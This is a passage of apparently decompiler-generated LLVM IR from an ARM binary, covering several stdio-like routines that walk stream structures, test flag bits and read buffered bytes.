  %v4_16ecc = call i32 @function_173d4(i8* %v3_16ecc, i32 %v0_16ec4, i32 %v0_16ec8)
  %v0_16ed0 = load i32, i32* %sl.global-to-local, align 4
  %v2_16ed0 = icmp eq i32 %v0_16ed0, 0
  store i32 %v4_16ecc, i32* %r4.global-to-local, align 4
  br i1 %v2_16ed0, label %dec_label_pc_16ec0..thread3_crit_edge, label %bb17

dec_label_pc_16ec0..thread3_crit_edge:            ; preds = %dec_label_pc_16ec0
  %v0_16eec.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_16ec0
  %v1_16ee4 = load i32, i32* @r5, align 4
  %v3_16ee4 = add i32 %v1_16ee4, 28
  %v4_16ee4 = inttoptr i32 %v3_16ee4 to i32*
  %v5_16ee4 = load i32, i32* %v4_16ee4, align 4
  store i32 %v5_16ee4, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16ec0..thread3_crit_edge, %bb17
  %v0_16eec = phi i32 [ %v0_16eec.pre, %dec_label_pc_16ec0..thread3_crit_edge ], [ %v5_16ee4, %bb17 ]
  %v2_16eec = xor i1 %v2_16ed0, true
  call void @__pseudo_cond_branch(i1 %v2_16eec, i32 %v0_16eec)
  %v0_16ef0 = load i32, i32* %r4.global-to-local, align 4
  %v2_16ef8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16ef8, i32* %r4.global-to-local, align 4
  store i32 %v6_16e58, i32* @r5, align 4
  store i32 %v9_16e58, i32* @r6, align 4
  store i32 %v12_16e58, i32* @r7, align 4
  store i32 %v21_16e58, i32* @lr, align 4
  ret i32 %v0_16ef0

; uselistorder directives
  uselistorder i32 %v3_16e5c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16ec0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_16f04(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f04:
  %v0_16f04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16f04, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16f04
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16f04, %bb
  %v10_16f10 = phi i32 [ %arg1, %dec_label_pc_16f04 ], [ 0, %bb ]
  ret i32 %v10_16f10

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_16f14() local_unnamed_addr {
dec_label_pc_16f14:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16f14 = load i32, i32* @r4, align 4
  store i32 %v3_16f14, i32* %stack_var_-24, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r6.global-to-local, align 4
  %v4_16f24 = load i32, i32* inttoptr (i32 144352 to i32*), align 32
  store i32 %v4_16f24, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_16f2c = load i32, i32* inttoptr (i32 144424 to i32*), align 8
  store i32 %v4_16f2c, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_16f38 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  store i32 %v4_16f38, i32* %r7.global-to-local, align 4
  %v2_16f44 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_16f38)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_16f58 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f58 = add i32 %v0_16f58, 20
  %v3_16f58 = inttoptr i32 %v2_16f58 to i32*
  %v4_16f58 = load i32, i32* %v3_16f58, align 4
  store i32 %v4_16f58, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16f58)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_16f68 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f68 = add i32 %v0_16f68, 12
  %v3_16f68 = inttoptr i32 %v2_16f68 to i32*
  %v4_16f68 = load i32, i32* %v3_16f68, align 4
  store i32 %v4_16f68, i32* %r3.global-to-local, align 4
  %v1_16f6c = inttoptr i32 %v4_16f68 to i32*
  %v2_16f6c = load i32, i32* %v1_16f6c, align 4
  store i32 %v2_16f6c, i32* %r3.global-to-local, align 4
  %v7_16f70 = icmp eq i32 %v2_16f6c, 1
  br i1 %v7_16f70, label %dec_label_pc_16f78, label %dec_label_pc_17038

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16f14
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_16f7c = add i32 %v0_16f68, 52
  %v3_16f7c = inttoptr i32 %v2_16f7c to i32*
  %v4_16f7c = load i32, i32* %v3_16f7c, align 4
  store i32 %v4_16f7c, i32* %r3.global-to-local, align 4
  %v1_16f80 = inttoptr i32 %v4_16f7c to i32*
  %v2_16f80 = load i32, i32* %v1_16f80, align 4
  store i32 %v2_16f80, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_16f80, 1
  br i1 %tmp30, label %dec_label_pc_17038, label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f78
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_16f90 = add i32 %v0_16f68, 100
  %v3_16f90 = inttoptr i32 %v2_16f90 to i32*
  %v4_16f90 = load i32, i32* %v3_16f90, align 4
  store i32 %v4_16f90, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16f38)
  call void @__pseudo_branch(i32 %v4_16f58)
  %v0_16fb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16fb8 = add i32 %v0_16fb8, 48
  %v3_16fb8 = inttoptr i32 %v2_16fb8 to i32*
  %v4_16fb8 = load i32, i32* %v3_16fb8, align 4
  store i32 %v4_16fb8, i32* %r3.global-to-local, align 4
  %v1_16fbc = inttoptr i32 %v4_16fb8 to i32*
  %v2_16fbc = load i32, i32* %v1_16fbc, align 4
  store i32 %v2_16fbc, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1700811 = icmp eq i32 %v2_16fbc, 0
  br i1 %v2_1700811, label %dec_label_pc_17014, label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16f8c, %dec_label_pc_17004
  %v0_16ff02 = phi i32 [ %v0_17004, %dec_label_pc_17004 ], [ %v2_16fbc, %dec_label_pc_16f8c ]
  %v1_16fcc = inttoptr i32 %v0_16ff02 to i16*
  %v2_16fcc = load i16, i16* %v1_16fcc, align 2
  %v3_16fcc = zext i16 %v2_16fcc to i32
  store i32 %v3_16fcc, i32* %r3.global-to-local, align 4
  %v2_16fd0 = and i32 %v3_16fcc, 32816
  %v7_16fd4 = icmp eq i32 %v2_16fd0, 48
  %v1_16fd8 = add i32 %v0_16ff02, 32
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i32*
  %v3_16fd8 = load i32, i32* %v2_16fd8, align 4
  store i32 %v3_16fd8, i32* %r5.global-to-local, align 4
  br i1 %v7_16fd4, label %dec_label_pc_16fe4, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_16fcc
  store i32 %v0_16ff02, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17004

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fcc
  %v0_16fe4 = load i32, i32* %r7.global-to-local, align 4
  %v2_16fe4 = icmp eq i32 %v0_16fe4, 0
  br i1 %v2_16fe4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_16fe4
  %v1_16fe8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16fe8 = load i32, i32* %r8.global-to-local, align 4
  %v3_16fe8 = add i32 %v2_16fe8, %v1_16fe8
  %v4_16fe8 = inttoptr i32 %v3_16fe8 to i32*
  %v5_16fe8 = load i32, i32* %v4_16fe8, align 4
  store i32 %v5_16fe8, i32* %r3.global-to-local, align 4
  %v3_16fec = inttoptr i32 %v5_16fe8 to i32*
  store i32 %v3_16fd8, i32* %v3_16fec, align 4
  %v0_16ff0 = load i32, i32* %r4.global-to-local, align 4
  %v1_16ff0 = inttoptr i32 %v0_16ff0 to i16*
  %v2_16ff0 = load i16, i16* %v1_16ff0, align 2
  %v3_16ff0 = zext i16 %v2_16ff0 to i32
  store i32 %v3_16ff0, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_16fe4
  %v2_16ff08 = load i16, i16* %v1_16fcc, align 2
  %v3_16ff09 = zext i16 %v2_16ff08 to i32
  store i32 %v3_16ff09, i32* %r3.global-to-local, align 4
  %v3_16ff4 = add i32 %v0_16fe4, 32
  %v4_16ff4 = inttoptr i32 %v3_16ff4 to i32*
  store i32 %v3_16fd8, i32* %v4_16ff4, align 4
  %v0_16ff8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_16ff8 = phi i32 [ %v3_16ff0, %.thread ], [ %v0_16ff8.pre, %bb ]
  %v1_16ff8 = and i32 %v0_16ff8, 8192
  %v2_16ff8 = icmp eq i32 %v1_16ff8, 0
  br i1 %v2_16ff8, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_17000 = xor i1 %v2_16ff8, true
  call void @__pseudo_cond_branch(i1 %v1_17000, i32 ptrtoint (i32* @global_var_13684.435 to i32))
  %v0_17004.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %.thread21, %bb33
  %v0_17004 = phi i32 [ %v0_17004.pre, %bb33 ], [ %v3_16fd8, %.thread21 ]
  store i32 %v0_17004, i32* %r4.global-to-local, align 4
  %v2_17008 = icmp eq i32 %v0_17004, 0
  br i1 %v2_17008, label %dec_label_pc_17008.dec_label_pc_17014_crit_edge, label %dec_label_pc_16fcc

dec_label_pc_17008.dec_label_pc_17014_crit_edge:  ; preds = %dec_label_pc_17004
  %v0_17020.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_17008.dec_label_pc_17014_crit_edge, %dec_label_pc_16f8c
  %v0_17020 = phi i32 [ %v0_17020.pre, %dec_label_pc_17008.dec_label_pc_17014_crit_edge ], [ %v0_16fb8, %dec_label_pc_16f8c ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_17020 = add i32 %v0_17020, 28
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  %v4_17020 = load i32, i32* %v3_17020, align 4
  call void @__pseudo_branch(i32 %v4_17020)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_17030 = load i32, i32* %r6.global-to-local, align 4
  %v2_17030 = add i32 %v0_17030, 52
  %v3_17030 = inttoptr i32 %v2_17030 to i32*
  %v4_17030 = load i32, i32* %v3_17030, align 4
  store i32 %v4_17030, i32* %r3.global-to-local, align 4
  %v0_17034 = load i32, i32* %r4.global-to-local, align 4
  %v2_17034 = inttoptr i32 %v4_17030 to i32*
  store i32 %v0_17034, i32* %v2_17034, align 4
  %v0_1703c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_16f14, %dec_label_pc_16f78, %dec_label_pc_17014
  %v0_1703c = phi i32 [ %v0_16f68, %dec_label_pc_16f14 ], [ %v0_16f68, %dec_label_pc_16f78 ], [ %v0_1703c.pre, %dec_label_pc_17014 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1703c = add i32 %v0_1703c, 12
  %v3_1703c = inttoptr i32 %v2_1703c to i32*
  %v4_1703c = load i32, i32* %v3_1703c, align 4
  %v1_17040 = inttoptr i32 %v4_1703c to i32*
  %v2_17040 = load i32, i32* %v1_17040, align 4
  %v1_17044 = add i32 %v2_17040, -1
  store i32 %v1_17044, i32* %v1_17040, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_17058 = load i32, i32* %r6.global-to-local, align 4
  %v2_17058 = add i32 %v0_17058, 28
  %v3_17058 = inttoptr i32 %v2_17058 to i32*
  %v4_17058 = load i32, i32* %v3_17058, align 4
  call void @__pseudo_branch(i32 %v4_17058)
  %v2_17068 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17068, i32* %r4.global-to-local, align 4
  ret i32 %v2_16f44

; uselistorder directives
  uselistorder i32 %v0_17004, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_17038, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17004, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_16fcc, { 1, 0 }
}

define i32 @function_17074(i16* %arg1) local_unnamed_addr {
dec_label_pc_17074:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_17074 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17074, label %bb, label %dec_label_pc_17074..thread8_crit_edge

dec_label_pc_17074..thread8_crit_edge:            ; preds = %dec_label_pc_17074
  %v0_170b0.pre = load i32, i32* @r0, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_17074
  store i32 0, i32* @r0, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17074..thread8_crit_edge, %bb
  %v0_170cc.pr = phi i32 [ %v0_170b0.pre, %dec_label_pc_17074..thread8_crit_edge ], [ 0, %bb ]
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %sb.global-to-local, align 4
  %v4_170ac = load i32, i32* inttoptr (i32 144360 to i32*), align 8
  store i32 %v4_170ac, i32* %r3.global-to-local, align 4
  %v9_170b0 = icmp eq i32 %v0_170cc.pr, %v4_170ac
  store i32 %v0_170cc.pr, i32* %fp.global-to-local, align 4
  br i1 %v9_170b0, label %bb49, label %dec_label_pc_170c8

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_170d8

dec_label_pc_170c8:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_170cc = icmp eq i32 %v0_170cc.pr, 0
  br i1 %v2_170cc, label %dec_label_pc_170d8, label %dec_label_pc_17240

dec_label_pc_170d8:                               ; preds = %bb49, %dec_label_pc_170c8
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_170c8 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_170ec = load i32, i32* inttoptr (i32 144424 to i32*), align 8
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_170f8 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  store i32 20, i32* %stack_var_-72, align 4
  store i32 %v4_170ec, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_170f8)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1711c = load i32, i32* %sb.global-to-local, align 4
  %v2_1711c = add i32 %v0_1711c, 20
  %v3_1711c = inttoptr i32 %v2_1711c to i32*
  %v4_1711c = load i32, i32* %v3_1711c, align 4
  call void @__pseudo_branch(i32 %v4_1711c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1712c = add i32 %v0_1711c, 12
  %v3_1712c = inttoptr i32 %v2_1712c to i32*
  %v4_1712c = load i32, i32* %v3_1712c, align 4
  store i32 %v4_1712c, i32* %r2.global-to-local, align 4
  %v1_17130 = inttoptr i32 %v4_1712c to i32*
  %v2_17130 = load i32, i32* %v1_17130, align 4
  store i32 28, i32* %sl.global-to-local, align 4
  %v1_17138 = add i32 %v2_17130, 1
  store i32 %v1_17138, i32* %r3.global-to-local, align 4
  %v2_1713c = add i32 %v0_1711c, 28
  %v3_1713c = inttoptr i32 %v2_1713c to i32*
  %v4_1713c = load i32, i32* %v3_1713c, align 4
  store i32 %v1_17138, i32* %v1_17130, align 4
  call void @__pseudo_branch(i32 %v4_1713c)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_17158 = load i32, i32* %sb.global-to-local, align 4
  %v2_17158 = add i32 %v0_17158, 100
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  %v4_17158 = load i32, i32* %v3_17158, align 4
  store i32 %v4_17158, i32* @r4, align 4
  store i32 %v4_17158, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_170f8)
  call void @__pseudo_branch(i32 %v4_1711c)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_17180 = load i32, i32* %sb.global-to-local, align 4
  %v2_17180 = add i32 %v0_17180, 48
  %v3_17180 = inttoptr i32 %v2_17180 to i32*
  %v4_17180 = load i32, i32* %v3_17180, align 4
  store i32 %v4_17180, i32* %r3.global-to-local, align 4
  %v1_1718c = inttoptr i32 %v4_17180 to i32*
  %v2_1718c = load i32, i32* %v1_1718c, align 4
  store i32 %v2_1718c, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_1713c)
  %v0_17198 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17198, i32* @r6, align 4
  %v2_1719c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1719c, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_17230.pr = load i32, i32* @r7, align 4
  %v2_1723028 = icmp eq i32 %v0_17230.pr, 0
  br i1 %v2_1723028, label %dec_label_pc_17238, label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %dec_label_pc_170d8, %dec_label_pc_1722c
  %v0_171b0 = phi i32 [ %v3_1722c, %dec_label_pc_1722c ], [ %v0_17230.pr, %dec_label_pc_170d8 ]
  %v1_171a4 = inttoptr i32 %v0_171b0 to i16*
  %v2_171a4 = load i16, i16* %v1_171a4, align 2
  %v3_171a4 = zext i16 %v2_171a4 to i32
  store i32 %v3_171a4, i32* %r3.global-to-local, align 4
  %v1_171a8 = and i32 %v3_171a4, 64
  %v2_171a8 = icmp eq i32 %v1_171a8, 0
  br i1 %v2_171a8, label %dec_label_pc_1722c, label %dec_label_pc_171b0

dec_label_pc_171b0:                               ; preds = %dec_label_pc_171a4
  %v1_171b0 = add i32 %v0_171b0, 56
  store i32 %v1_171b0, i32* @r4, align 4
  store i32 %v1_171b0, i32* %r2.global-to-local, align 4
  %v0_171c0 = load i32, i32* %sb.global-to-local, align 4
  %v1_171c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_171c0 = add i32 %v1_171c0, %v0_171c0
  %v3_171c0 = inttoptr i32 %v2_171c0 to i32*
  %v4_171c0 = load i32, i32* %v3_171c0, align 4
  call void @__pseudo_branch(i32 %v4_171c0)
  %v1_171d0 = load i32, i32* @r8, align 4
  %v2_171d0 = add i32 %v1_171d0, %v0_171c0
  %v3_171d0 = inttoptr i32 %v2_171d0 to i32*
  %v4_171d0 = load i32, i32* %v3_171d0, align 4
  call void @__pseudo_branch(i32 %v4_171d0)
  %v0_171dc = load i32, i32* @r7, align 4
  %v1_171dc = inttoptr i32 %v0_171dc to i16*
  %v2_171dc = load i16, i16* %v1_171dc, align 2
  %v3_171dc = zext i16 %v2_171dc to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_171e4 = or i32 %v3_171dc, %stack_var_-60.1.in
  %v1_171e8 = xor i32 %v2_171e4, 320
  store i32 %v1_171e8, i32* %r3.global-to-local, align 4
  %v1_171ec = and i32 %v1_171e8, 832
  %v2_171ec = icmp eq i32 %v1_171ec, 0
  br i1 %v2_171ec, label %dec_label_pc_171f4, label %bb50

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171b0
  store i32 %v0_171dc, i32* @r0, align 4
  %v0_171f8 = call i32 @function_10c14()
  %v2_171fc = icmp eq i32 %v0_171f8, 0
  br i1 %v2_171fc, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_171f4
  %v1_17200 = load i32, i32* @r7, align 4
  %v2_17200 = inttoptr i32 %v1_17200 to i16*
  %v3_17200 = load i16, i16* %v2_17200, align 2
  %v4_17200 = zext i16 %v3_17200 to i32
  store i32 %v4_17200, i32* %r3.global-to-local, align 4
  %v2_17204 = add i32 %v1_17200, 8
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  %v4_17204 = load i32, i32* %v3_17204, align 4
  store i32 %v4_17204, i32* %r2.global-to-local, align 4
  %v2_17208 = and i32 %v4_17200, 65471
  store i32 %v2_17208, i32* %r3.global-to-local, align 4
  %v3_1720c = add i32 %v1_17200, 28
  %v4_1720c = inttoptr i32 %v3_1720c to i32*
  store i32 %v4_17204, i32* %v4_1720c, align 4
  %v1_17210 = load i32, i32* %r3.global-to-local, align 4
  %v2_17210 = trunc i32 %v1_17210 to i16
  %v3_17210 = load i32, i32* @r7, align 4
  %v4_17210 = inttoptr i32 %v3_17210 to i16*
  store i16 %v2_17210, i16* %v4_17210, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_171f4
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_171b0, %.thread17
  %v0_17220 = load i32, i32* %sb.global-to-local, align 4
  %v1_17220 = load i32, i32* %sl.global-to-local, align 4
  %v2_17220 = add i32 %v1_17220, %v0_17220
  %v3_17220 = inttoptr i32 %v2_17220 to i32*
  %v4_17220 = load i32, i32* %v3_17220, align 4
  call void @__pseudo_branch(i32 %v4_17220)
  %v0_1722c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1722c

dec_label_pc_1722c:                               ; preds = %dec_label_pc_171a4, %bb50
  %v0_1722c = phi i32 [ %v0_171b0, %dec_label_pc_171a4 ], [ %v0_1722c.pre, %bb50 ]
  %v1_1722c = add i32 %v0_1722c, 32
  %v2_1722c = inttoptr i32 %v1_1722c to i32*
  %v3_1722c = load i32, i32* %v2_1722c, align 4
  store i32 %v3_1722c, i32* @r7, align 4
  %v2_17230 = icmp eq i32 %v3_1722c, 0
  br i1 %v2_17230, label %dec_label_pc_17238, label %dec_label_pc_171a4

dec_label_pc_17238:                               ; preds = %dec_label_pc_1722c, %dec_label_pc_170d8
  %v0_17238 = call i32 @function_16f14()
  %v0_17274.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_17240:                               ; preds = %dec_label_pc_170c8
  %v1_17240 = inttoptr i32 %v0_170cc.pr to i16*
  %v2_17240 = load i16, i16* %v1_17240, align 2
  %v3_17240 = zext i16 %v2_17240 to i32
  %v1_17244 = and i32 %v3_17240, 64
  store i32 %v1_17244, i32* %r3.global-to-local, align 4
  %v2_17244 = icmp eq i32 %v1_17244, 0
  br i1 %v2_17244, label %bb51, label %dec_label_pc_17250

bb51:                                             ; preds = %dec_label_pc_17240
  br label %bb52

dec_label_pc_17250:                               ; preds = %dec_label_pc_17240
  %v0_17250 = call i32 @function_10c14()
  %v2_17254 = icmp eq i32 %v0_17250, 0
  br i1 %v2_17254, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_17250
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_17250
  %v1_17258 = load i32, i32* %fp.global-to-local, align 4
  %v2_17258 = inttoptr i32 %v1_17258 to i16*
  %v3_17258 = load i16, i16* %v2_17258, align 2
  %v4_17258 = zext i16 %v3_17258 to i32
  store i32 %v4_17258, i32* %r3.global-to-local, align 4
  %v2_1725c = add i32 %v1_17258, 8
  %v3_1725c = inttoptr i32 %v2_1725c to i32*
  %v4_1725c = load i32, i32* %v3_1725c, align 4
  store i32 %v4_1725c, i32* %r2.global-to-local, align 4
  %v2_17260 = and i32 %v4_17258, 65471
  store i32 %v2_17260, i32* %r3.global-to-local, align 4
  %v2_17264 = trunc i32 %v2_17260 to i16
  store i16 %v2_17264, i16* %v2_17258, align 2
  %v1_17268 = load i32, i32* %r2.global-to-local, align 4
  %v2_17268 = load i32, i32* %fp.global-to-local, align 4
  %v3_17268 = add i32 %v2_17268, 28
  %v4_17268 = inttoptr i32 %v3_17268 to i32*
  store i32 %v1_17268, i32* %v4_17268, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_17238, %.thread24
  %v0_17274 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_17274.pre, %dec_label_pc_17238 ], [ 0, %.thread24 ]
  ret i32 %v0_17274

; uselistorder directives
  uselistorder i32 %v3_1722c, { 1, 2, 0 }
  uselistorder i32 %v0_1711c, { 1, 0, 2 }
  uselistorder i32 %v0_170cc.pr, { 1, 0, 2, 3 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_16f14, { 1, 0 }
  uselistorder i32 112, { 2, 3, 4, 9, 0, 10, 5, 1, 11, 6, 7, 8 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1722c, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_171a4, { 1, 0 }
  uselistorder label %dec_label_pc_170d8, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_17288(i32 %arg1) local_unnamed_addr {
dec_label_pc_17288:
  %v0_17288 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17288, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_17288
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17288, %bb
  %v5_172a4 = phi i32 [ %arg1, %dec_label_pc_17288 ], [ 0, %bb ]
  ret i32 %v5_172a4

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_172a8(i16* %arg1) local_unnamed_addr {
dec_label_pc_172a8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_172a8 = load i32, i32* @r4, align 4
  store i32 %v3_172a8, i32* %stack_var_-12, align 4
  %v6_172a8 = load i32, i32* @r5, align 4
  %v9_172a8 = load i32, i32* @lr, align 4
  %v0_172ac = load i32, i32* @r0, align 4
  %v1_172ac = add i32 %v0_172ac, 16
  %v2_172ac = inttoptr i32 %v1_172ac to i32*
  %v3_172ac = load i32, i32* %v2_172ac, align 4
  store i32 %v3_172ac, i32* %r2.global-to-local, align 4
  %v1_172b0 = add i32 %v0_172ac, 24
  %v2_172b0 = inttoptr i32 %v1_172b0 to i32*
  %v3_172b0 = load i32, i32* %v2_172b0, align 4
  %v3_172b4 = icmp ult i32 %v3_172ac, %v3_172b0
  store i32 %v0_172ac, i32* @r4, align 4
  br i1 %v3_172b4, label %bb, label %dec_label_pc_172d4

bb:                                               ; preds = %dec_label_pc_172a8
  %v2_172c0 = inttoptr i32 %v3_172ac to i8*
  %v3_172c0 = load i8, i8* %v2_172c0, align 1
  %v4_172c0 = zext i8 %v3_172c0 to i32
  store i32 %v4_172c0, i32* %r0.global-to-local, align 4
  %v6_172c0 = add i32 %v3_172ac, 1
  store i32 %v6_172c0, i32* %r2.global-to-local, align 4
  store i32 %v6_172c0, i32* %v2_172ac, align 4
  br label %dec_label_pc_173c0

dec_label_pc_172d4:                               ; preds = %dec_label_pc_172a8
  store i32 144312, i32* @r5, align 4
  %v1_172d4 = inttoptr i32 %v0_172ac to i16*
  %v2_172d4 = load i16, i16* %v1_172d4, align 2
  %v3_172d4 = zext i16 %v2_172d4 to i32
  %v1_172d8 = and i32 %v3_172d4, 131
  %tmp24 = icmp ugt i32 %v1_172d8, 128
  br i1 %tmp24, label %dec_label_pc_172f4, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172d4
  store i32 128, i32* @r1, align 4
  %v0_172e8 = call i32 @function_18b74()
  store i32 %v0_172e8, i32* %r0.global-to-local, align 4
  %v2_172ec = icmp eq i32 %v0_172e8, 0
  br i1 %v2_172ec, label %dec_label_pc_172e4.dec_label_pc_172f4_crit_edge, label %dec_label_pc_173bc

dec_label_pc_172e4.dec_label_pc_172f4_crit_edge:  ; preds = %dec_label_pc_172e4
  %v0_172f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_172f4

dec_label_pc_172f4:                               ; preds = %dec_label_pc_172e4.dec_label_pc_172f4_crit_edge, %dec_label_pc_172d4
  %v2_17334 = phi i32 [ %v0_172f4.pre, %dec_label_pc_172e4.dec_label_pc_172f4_crit_edge ], [ %v0_172ac, %dec_label_pc_172d4 ]
  %v1_172f4 = inttoptr i32 %v2_17334 to i16*
  %v2_172f4 = load i16, i16* %v1_172f4, align 2
  %v3_172f4 = zext i16 %v2_172f4 to i32
